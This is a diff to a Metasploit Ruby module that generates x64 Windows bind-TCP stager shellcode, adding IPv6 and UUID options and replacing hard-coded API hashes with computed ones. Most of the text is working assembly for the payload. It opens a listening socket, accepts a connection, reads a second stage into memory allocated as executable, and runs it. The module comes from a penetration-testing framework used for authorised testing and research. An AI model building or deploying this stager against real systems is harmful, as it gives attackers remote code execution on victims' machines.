@@ -2,6 +2,7 @@
 
 require 'msf/core'
 require 'msf/core/payload/transport_config'
+require 'msf/core/payload/windows/x64/send_uuid'
 require 'msf/core/payload/windows/x64/block_api'
 require 'msf/core/payload/windows/x64/exitfunk'
 
@@ -17,6 +18,7 @@ module Payload::Windows::BindTcp_x64
 
   include Msf::Payload::TransportConfig
   include Msf::Payload::Windows
+  include Msf::Payload::Windows::SendUUID_x64
   include Msf::Payload::Windows::BlockApi_x64
   include Msf::Payload::Windows::Exitfunk_x64
 
@@ -36,6 +38,18 @@ module Payload::Windows::BindTcp_x64
     end
 
     generate_bind_tcp(conf)
+  end
+
+  #
+  # By default, we don't want to send the UUID, but we'll send
+  # for certain payloads if requested.
+  #
+  def include_send_uuid
+    false
+  end
+
+  def use_ipv6
+    false
   end
 
   def transport_config(opts={})
@@ -63,7 +77,6 @@ module Payload::Windows::BindTcp_x64
   #
   def required_space
     # Start with our cached default generated size
-    # TODO: need help with this from the likes of HD.
     space = cached_size
 
     # EXITFUNK processing adds 31 bytes at most (for ExitThread, only ~16 for others)
@@ -74,6 +87,11 @@ module Payload::Windows::BindTcp_x64
     # TODO: this is coming soon
     # Reliability checks add 4 bytes for the first check, 5 per recv check (2)
     #space += 14
+
+    # 2 more bytes are added for IPv6
+    space += 2 if use_ipv6
+
+    space += uuid_required_size if include_send_uuid
 
     # The final estimated size
     space
@@ -87,8 +105,18 @@ module Payload::Windows::BindTcp_x64
   # @option opts [Bool] :reliable Whether or not to enable error handling code
   #
   def asm_bind_tcp(opts={})
-    reliable     = opts[:reliable]
-    encoded_port = "0x%.16x" % [opts[:port].to_i,2].pack("vn").unpack("N").first
+    reliable      = opts[:reliable]
+    addr_fam      = 2
+    sockaddr_size = 16
+    stack_alloc   = 408+8+8*6+32*7
+
+    if use_ipv6
+      addr_fam      = 23
+      sockaddr_size = 28
+      stack_alloc  += 8*2 # two more rax pushes
+    end
+
+    encoded_port = "0x%.16x" % [opts[:port].to_i, addr_fam].pack("vn").unpack("N").first
 
     asm = %Q^
       bind_tcp:
@@ -99,58 +127,85 @@ module Payload::Windows::BindTcp_x64
         sub rsp, 408+8         ; alloc sizeof( struct WSAData ) bytes for the WSAData
                                ; structure (+8 for alignment)
         mov r13, rsp           ; save pointer to the WSAData structure for WSAStartup call.
-        mov r12, #{encoded_port}        
-        push r12               ; bind to 0.0.0.0 family AF_INET and port 4444
+        xor rax, rax
+    ^
+
+    if use_ipv6
+      asm << %Q^
+        ; IPv6 requires another 12 zero-bytes for the socket structure,
+        ; so push 16 more onto the stack
+        push rax
+        push rax
+      ^
+    end
+
+    asm << %Q^
+        push rax               ; stack alignment
+        push rax               ; tail-end of the sockaddr_in/6 struct
+        mov r12, #{encoded_port}
+        push r12               ; bind to 0.0.0.0/[::] family AF_INET/6 and specified port
         mov r12, rsp           ; save pointer to sockaddr_in struct for bind call
+
         ; perform the call to LoadLibraryA...
         mov rcx, r14           ; set the param for the library to load
-        mov r10d, 0x0726774C   ; hash( "kernel32.dll", "LoadLibraryA" )
+        mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
         call rbp               ; LoadLibraryA( "ws2_32" )
+
         ; perform the call to WSAStartup...
         mov rdx, r13           ; second param is a pointer to this stuct
         push 0x0101            ;
         pop rcx                ; set the param for the version requested
-        mov r10d, 0x006B8029   ; hash( "ws2_32.dll", "WSAStartup" )
+        mov r10d, #{Rex::Text.block_api_hash('ws2_32.dll', 'WSAStartup')}
         call rbp               ; WSAStartup( 0x0101, &WSAData );
+
         ; perform the call to WSASocketA...
+        push #{addr_fam}       ; push AF_INET/6
+        pop rcx                ; pop family into rcx
         push rax               ; if we succeed, rax wil be zero, push zero for the flags param.
         push rax               ; push null for reserved parameter
         xor r9, r9             ; we do not specify a WSAPROTOCOL_INFO structure
         xor r8, r8             ; we do not specify a protocol
         inc rax                ;
         mov rdx, rax           ; push SOCK_STREAM
-        inc rax                ;
-        mov rcx, rax           ; push AF_INET
-        mov r10d, 0xE0DF0FEA   ; hash( "ws2_32.dll", "WSASocketA" )
-        call rbp               ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );
+        mov r10d, #{Rex::Text.block_api_hash('ws2_32.dll', 'WSASocketA')}
+        call rbp               ; WSASocketA( AF_INET/6, SOCK_STREAM, 0, 0, 0, 0 );
         mov rdi, rax           ; save the socket for later
+
         ; perform the call to bind...
-        push 16                ; 
+        push #{sockaddr_size}
         pop r8                 ; length of the sockaddr_in struct (we only set the
-                               ; first 8 bytes as the last 8 are unused)
+                               ; first 8 bytes as the rest aren't used)
         mov rdx, r12           ; set the pointer to sockaddr_in struct
         mov rcx, rdi           ; socket
-        mov r10d, 0x6737DBC2   ; hash( "ws2_32.dll", "bind" )
-        call rbp               ; bind( s, &sockaddr_in, 16 );
+        mov r10d, #{Rex::Text.block_api_hash('ws2_32.dll', 'bind')}
+        call rbp               ; bind( s, &sockaddr_in, #{sockaddr_size} );
+
         ; perform the call to listen...
         xor rdx, rdx           ; backlog
         mov rcx, rdi           ; socket
-        mov r10d, 0xFF38E9B7   ; hash( "ws2_32.dll", "listen" )
+        mov r10d, #{Rex::Text.block_api_hash('ws2_32.dll', 'listen')}
         call rbp               ; listen( s, 0 );
+
         ; perform the call to accept...
         xor r8, r8             ; we set length for the sockaddr struct to zero
         xor rdx, rdx           ; we dont set the optional sockaddr param
         mov rcx, rdi           ; listening socket
-        mov r10d, 0xE13BEC74   ; hash( "ws2_32.dll", "accept" )
+        mov r10d, #{Rex::Text.block_api_hash('ws2_32.dll', 'accept')}
         call rbp               ; accept( s, 0, 0 );
+
         ; perform the call to closesocket...
         mov rcx, rdi           ; the listening socket to close
         mov rdi, rax           ; swap the new connected socket over the listening socket
-        mov r10d, 0x614D6E75   ; hash( "ws2_32.dll", "closesocket" )
+        mov r10d, #{Rex::Text.block_api_hash('ws2_32.dll', 'closesocket')}
         call rbp               ; closesocket( s );
-        ; restore RSP so we dont have any alignment issues with the next block...
-        add rsp, #{408+8+8*4+32*7} ; cleanup the stack allocations
 
+        ; restore RSP so we dont have any alignment issues with the next block...
+        add rsp, #{stack_alloc} ; cleanup the stack allocations
+    ^
+
+    asm << asm_send_uuid if include_send_uuid
+
+    asm << %Q^
       recv:
         ; Receive the size of the incoming second stage...
         sub rsp, 16            ; alloc some space (16 bytes) on stack for to hold the second stage length
@@ -159,9 +214,10 @@ module Payload::Windows::BindTcp_x64
         push 4                 ; 
         pop r8                 ; length = sizeof( DWORD );
         mov rcx, rdi           ; the saved socket
-        mov r10d, 0x5FC8D902   ; hash( "ws2_32.dll", "recv" )
+        mov r10d, #{Rex::Text.block_api_hash('ws2_32.dll', 'recv')}
         call rbp               ; recv( s, &dwLength, 4, 0 );
         add rsp, 32            ; we restore RSP from the api_call so we can pop off RSI next
+
         ; Alloc a RWX buffer for the second stage
         pop rsi                ; pop off the second stage length
         push 0x40              ; 
@@ -170,18 +226,21 @@ module Payload::Windows::BindTcp_x64
         pop r8                 ; MEM_COMMIT
         mov rdx, rsi           ; the newly recieved second stage length.
         xor rcx, rcx           ; NULL as we dont care where the allocation is.
-        mov r10d, 0xE553A458   ; hash( "kernel32.dll", "VirtualAlloc" )
+        mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
         call rbp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
+
         ; Receive the second stage and execute it...
         mov rbx, rax           ; rbx = our new memory address for the new stage
         mov r15, rax           ; save the address so we can jump into it later
+
       read_more:               ;
         xor r9, r9             ; flags
         mov r8, rsi            ; length
         mov rdx, rbx           ; the current address into our second stages RWX buffer
         mov rcx, rdi           ; the saved socket
-        mov r10d, 0x5FC8D902   ; hash( "ws2_32.dll", "recv" )
+        mov r10d, #{Rex::Text.block_api_hash('ws2_32.dll', 'recv')}
         call rbp               ; recv( s, buffer, length, 0 );
+
         add rbx, rax           ; buffer += bytes_received
         sub rsi, rax           ; length -= bytes_received
         test rsi, rsi          ; test length
